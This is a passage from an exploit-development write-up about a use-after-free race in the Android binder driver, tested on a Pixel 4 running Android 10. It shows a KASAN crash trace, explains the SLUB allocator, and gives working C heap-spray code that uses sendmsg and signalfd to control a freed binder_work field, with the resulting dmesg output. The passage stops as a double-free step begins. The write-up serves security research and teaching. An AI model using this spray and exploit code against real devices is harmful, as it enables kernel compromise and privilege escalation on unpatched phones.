<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367631</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_release_work</span><span class="o">+</span><span class="mh">0x84</span><span class="o">/</span><span class="mh">0x1b8</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367644</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_thread_release</span><span class="o">+</span><span class="mh">0x2ac</span><span class="o">/</span><span class="mh">0x2e0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367655</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_ioctl</span><span class="o">+</span><span class="mh">0x9a4</span><span class="o">/</span><span class="mh">0x122c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367680</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">do_vfs_ioctl</span><span class="o">+</span><span class="mh">0x7c8</span><span class="o">/</span><span class="mh">0xefc</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367693</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">SyS_ioctl</span><span class="o">+</span><span class="mh">0x68</span><span class="o">/</span><span class="mh">0xa0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367716</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">el0_svc_naked</span><span class="o">+</span><span class="mh">0x34</span><span class="o">/</span><span class="mh">0x38</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367725</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367734</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Allocated</span> <span class="n">by</span> <span class="n">task</span> <span class="mi">20464</span><span class="p">:</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367747</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kasan_kmalloc</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">/</span><span class="mh">0x1ac</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367761</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kmem_cache_alloc_trace</span><span class="o">+</span><span class="mh">0x3b8</span><span class="o">/</span><span class="mh">0x454</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367774</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_new_node</span><span class="o">+</span><span class="mh">0x4c</span><span class="o">/</span><span class="mh">0x394</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367802</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_transaction</span><span class="o">+</span><span class="mh">0x2398</span><span class="o">/</span><span class="mh">0x4308</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367816</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_ioctl_write_read</span><span class="o">+</span><span class="mh">0xc28</span><span class="o">/</span><span class="mh">0x4dc8</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367826</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_ioctl</span><span class="o">+</span><span class="mh">0x650</span><span class="o">/</span><span class="mh">0x122c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367836</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">do_vfs_ioctl</span><span class="o">+</span><span class="mh">0x7c8</span><span class="o">/</span><span class="mh">0xefc</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367846</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">SyS_ioctl</span><span class="o">+</span><span class="mh">0x68</span><span class="o">/</span><span class="mh">0xa0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367862</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">el0_svc_naked</span><span class="o">+</span><span class="mh">0x34</span><span class="o">/</span><span class="mh">0x38</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367868</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367936</span><span class="p">]</span> <span class="n">c7</span>  <span class="mi">20469</span> <span class="n">CPU7</span><span class="p">:</span> <span class="n">update</span> <span class="nb">max</span> <span class="n">cpu_capacity</span> <span class="mi">989</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368496</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Freed</span> <span class="n">by</span> <span class="n">task</span> <span class="mi">594</span><span class="p">:</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368518</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">__kasan_slab_free</span><span class="o">+</span><span class="mh">0x13c</span><span class="o">/</span><span class="mh">0x21c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368534</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kasan_slab_free</span><span class="o">+</span><span class="mh">0x10</span><span class="o">/</span><span class="mh">0x1c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368549</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kfree</span><span class="o">+</span><span class="mh">0x248</span><span class="o">/</span><span class="mh">0x810</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368564</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_free_ref</span><span class="o">+</span><span class="mh">0x30</span><span class="o">/</span><span class="mh">0x64</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368584</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_update_ref_for_handle</span><span class="o">+</span><span class="mh">0x294</span><span class="o">/</span><span class="mh">0x2b0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368600</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_transaction_buffer_release</span><span class="o">+</span><span class="mh">0x46c</span><span class="o">/</span><span class="mh">0x7a0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368616</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_ioctl_write_read</span><span class="o">+</span><span class="mh">0x21d0</span><span class="o">/</span><span class="mh">0x4dc8</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368653</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">binder_ioctl</span><span class="o">+</span><span class="mh">0x650</span><span class="o">/</span><span class="mh">0x122c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368667</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">do_vfs_ioctl</span><span class="o">+</span><span class="mh">0x7c8</span><span class="o">/</span><span class="mh">0xefc</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368684</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">SyS_ioctl</span><span class="o">+</span><span class="mh">0x68</span><span class="o">/</span><span class="mh">0xa0</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368697</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">el0_svc_naked</span><span class="o">+</span><span class="mh">0x34</span><span class="o">/</span><span class="mh">0x38</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368704</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368735</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">The</span> <span class="n">buggy</span> <span class="n">address</span> <span class="n">belongs</span> <span class="n">to</span> <span class="n">the</span> <span class="n">object</span> <span class="n">at</span> <span class="n">ffffffc053e45800</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368735</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">which</span> <span class="n">belongs</span> <span class="n">to</span> <span class="n">the</span> <span class="n">cache</span> <span class="n">kmalloc</span><span class="o">-</span><span class="mi">256</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">256</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368753</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">The</span> <span class="n">buggy</span> <span class="n">address</span> <span class="k">is</span> <span class="n">located</span> <span class="mi">80</span> <span class="n">bytes</span> <span class="n">inside</span> <span class="n">of</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368753</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="mi">256</span><span class="o">-</span><span class="n">byte</span> <span class="n">region</span> <span class="p">[</span><span class="n">ffffffc053e45800</span><span class="p">,</span> <span class="n">ffffffc053e45900</span><span class="p">)</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368767</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">The</span> <span class="n">buggy</span> <span class="n">address</span> <span class="n">belongs</span> <span class="n">to</span> <span class="n">the</span> <span class="n">page</span><span class="p">:</span>
<span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368779</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">page</span><span class="p">:</span><span class="n">ffffffbf014f9100</span> <span class="n">count</span><span class="p">:</span><span class="mi">1</span> <span class="n">mapcount</span><span class="p">:</span><span class="mi">0</span> <span class="n">mapping</span><span class="p">:</span>          <span class="p">(</span><span class="nb nb-Type">null</span><span class="p">)</span> <span class="n">index</span><span class="p">:</span><span class="mh">0x0</span> <span class="n">compound_mapcount</span><span class="p">:</span> <span class="mi">0</span>
<span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368804</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">flags</span><span class="p">:</span> <span class="mh">0x10200</span><span class="p">(</span><span class="n">slab</span><span class="o">|</span><span class="n">head</span><span class="p">)</span>
<span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368824</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">raw</span><span class="p">:</span> <span class="mi">0000000000010200</span> <span class="mi">0000000000000000</span> <span class="mi">0000000000000000</span> <span class="mi">0000000100150015</span>
<span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368843</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">raw</span><span class="p">:</span> <span class="n">ffffffbf04e39e00</span> <span class="mf">0000000e00000002</span> <span class="n">ffffffc148c0fa00</span> <span class="mi">0000000000000000</span>
<span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368867</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">page</span> <span class="n">dumped</span> <span class="n">because</span><span class="p">:</span> <span class="n">kasan</span><span class="p">:</span> <span class="n">bad</span> <span class="n">access</span> <span class="n">detected</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368882</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368894</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Memory</span> <span class="n">state</span> <span class="n">around</span> <span class="n">the</span> <span class="n">buggy</span> <span class="n">address</span><span class="p">:</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368910</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">ffffffc053e45700</span><span class="p">:</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368955</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">ffffffc053e45780</span><span class="p">:</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368984</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="o">&gt;</span><span class="n">ffffffc053e45800</span><span class="p">:</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.368997</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>                                                  <span class="o">^</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.369012</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">ffffffc053e45880</span><span class="p">:</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span> <span class="n">fb</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.369037</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">ffffffc053e45900</span><span class="p">:</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span> <span class="n">fc</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.369049</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="o">==================================================================</span>
</code></pre></div>

<h3 id="exploitation-strategy">Exploitation Strategy</h3>
<p>It's one thing to trigger the use-after-free, but it's a whole other story to reach code execution using it. This section will try to explain how the bug can be exploited one step at a time and with, hopefully, enough details to understand the general thought process.</p>
<p>Our tests will be performed on a Pixel 4 device running the latests Android 10 factory image <code>QQ3A.200805.001</code> released in August 2020, with no security updates. This factory image can be found on the <a href="https://developers.google.com/android/images#flame">Google developers website</a>.</p>
<h4 id="use-after-frees-and-the-slub-allocator">Use-After-Frees and the SLUB Allocator</h4>
<p>The general idea behind a use-after-free, as its name suggests, is to keep using a dynamically-allocated object after it's been freed. What makes it interesting is that this freed object can now be replaced by another of a different layout to create a type confusion on specific fields of the original structure. Now when the exploited program continues to run, it will use the object that has been reallocated as if it was the original one, which could lead to a redirection of the execution flow.</p>
<p>Exploiting a use-after-free is highly dependent on the dynamic allocation system used. Android uses a system called the SLUB allocator.</p>
<p>Since this article is not about explaining how the SLUB allocator works, if you're not already familiar with it, we invite you to read resources on the subject, such as <a href="https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md">this one</a>, to fully understand the rest of this post.</p>
<p>Essentially, the slab is divided into caches storing objects of a specific size or of a specific type. In our case, we want to reallocate over a <code>binder_node</code> object. A <code>binder_node</code> structure is 128-byte long and does not have a dedicated cache on a Pixel 4 running Android 10, which means it's located in the <code>kmalloc-128</code> cache. Therefore, we will need to spray using an object with a size lesser or equal to 128-byte, which will be discussed next.</p>
<h4 id="controlling-the-switch-case-in-binder_release_work">Controlling the Switch Case in <code>binder_release_work</code></h4>
<p>We established earlier that the use-after-free could be used to control the switch/case argument in <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4561"><code>binder_release_work</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* &lt;-- Value controlled with the use-after-free */</span>
        <span class="c1">// [...]</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="n">pr_err</span><span class="p">(</span><span class="s">"unexpected work type, %d, not freed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                   <span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>In this section we will spray the slab to change the value read by <code>w-&gt;type</code> and have it displayed by the <code>default</code> case.</p>
<p>The technique we will use to spray has been detailed in <a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Project Zero's "Mitigations are attack surface, too"</a> and relies on the use of <code>sendmsg</code> and <code>signalfd</code>.</p>
<ol>
<li><code>sendmsg</code> allocates a 128-byte kernel object filled almost entirely with user-controlled data</li>
<li>the <code>sendmsg</code> object is freed</li>
<li>right after, a <code>signalfd</code> allocation is made, creating a 8-byte object (also part of the 128-kmalloc cache) that will most likely replace the previous sendmsg, pinning its content in memory.</li>
</ol>
<p>With this spraying technique, it's possible to obtain the following outcome that would give us control over <code>w-&gt;type</code>.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/sendmsg_signalfd.png"></p>
<p>It's also possible to achieve the same effect with only blocking <code>sendmsg</code>, as explained in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">Lexfo's "CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 3/4)"</a>. However, the exploit would be way slower and, as we will see in the next sections, <code>signalfd</code> plays an important role in the exploitation of this vulnerability.</p>
<p>A function similar to the one given below can be used to spray <code>sendmsg</code> and <code>signalfd</code> objects in kernel memory to control <code>w-&gt;type</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">spray_thread_func</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">argp</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">spray_thread_data</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">spray_thread_data</span><span class="o">*</span><span class="p">)</span><span class="n">argp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">delay</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">msg_buf</span><span class="p">[</span><span class="n">SENDMSG_SIZE</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)];</span>
    <span class="kt">int</span> <span class="n">ctl_buf</span><span class="p">[</span><span class="n">SENDMSG_CONTROL_SIZE</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)];</span>
    <span class="k">struct</span> <span class="nc">msghdr</span> <span class="n">spray_msg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">iovec</span> <span class="n">siov</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">sigset_value</span><span class="p">;</span>

    <span class="c1">// Sendmsg control buffer initialization</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">spray_msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">spray_msg</span><span class="p">));</span>
    <span class="n">ctl_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">SENDMSG_CONTROL_SIZE</span> <span class="o">-</span> <span class="n">WORK_STRUCT_OFFSET</span><span class="p">;</span>
    <span class="n">ctl_buf</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span> <span class="cm">/* w-&gt;type value */</span>
    <span class="n">siov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">msg_buf</span><span class="p">;</span>
    <span class="n">siov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">SENDMSG_SIZE</span><span class="p">;</span>
    <span class="n">spray_msg</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">siov</span><span class="p">;</span>
    <span class="n">spray_msg</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">spray_msg</span><span class="p">.</span><span class="n">msg_control</span> <span class="o">=</span> <span class="n">ctl_buf</span><span class="p">;</span>
    <span class="n">spray_msg</span><span class="p">.</span><span class="n">msg_controllen</span> <span class="o">=</span> <span class="n">SENDMSG_CONTROL_SIZE</span> <span class="o">-</span> <span class="n">WORK_STRUCT_OFFSET</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="c1">// Barrier - Before spray</span>
        <span class="n">pthread_barrier_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">barrier</span><span class="p">);</span>

        <span class="c1">// Waiting some time</span>
        <span class="n">delay</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">SPRAY_DELAY</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">delay</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{}</span>

        <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_SIGNALFDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Arbitrary signalfd value (will become relevant later)</span>
            <span class="n">sigset_value</span> <span class="o">=</span> <span class="o">~</span><span class="mi">0</span><span class="p">;</span>
            <span class="c1">// Non-blocking sendmsg</span>
            <span class="n">sendmsg</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">sock_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">spray_msg</span><span class="p">,</span> <span class="n">MSG_OOB</span><span class="p">);</span>
            <span class="c1">// Signalfd call to pin sendmsg's control buffer in kernel memory</span>
            <span class="n">signalfd_fds</span><span class="p">[</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">trigger_id</span><span class="p">][</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">spray_id</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">signalfd</span><span class="p">(</span><span class="mi">-1</span><span class="p">,</span> <span class="p">(</span><span class="kt">sigset_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sigset_value</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">signalfd_fds</span><span class="p">[</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">trigger_id</span><span class="p">][</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">spray_id</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not open signalfd - %d (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">signalfd_fds</span><span class="p">[</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">trigger_id</span><span class="p">][</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">spray_id</span><span class="p">][</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1">// Barrier - After spray</span>
        <span class="n">pthread_barrier_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">barrier</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>If the exploit ran successfully, you should see the following logs in <code>dmesg</code> after some time:</p>
<div class="codehilite"><pre><span></span><code><span class="err">[ 1245.158628] binder: unexpected work type, -559038737, not freed</span>
<span class="err">[ 1249.805270] binder: unexpected work type, -559038737, not freed</span>
<span class="err">[ 1256.615639] binder: unexpected work type, -559038737, not freed</span>
<span class="err">[ 1258.221516] binder: unexpected work type, -559038737, not freed</span>
</code></pre></div>

<h4 id="slab-object-double-free">Slab Object Double Free</h4>
<p>Even though we know how to control the switch/case argument, we haven't discussed yet what we could do with the use-after-free in <code>binder_release_work</code>. Let's have a look at the rest of the function to identify interesting code paths to reach.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
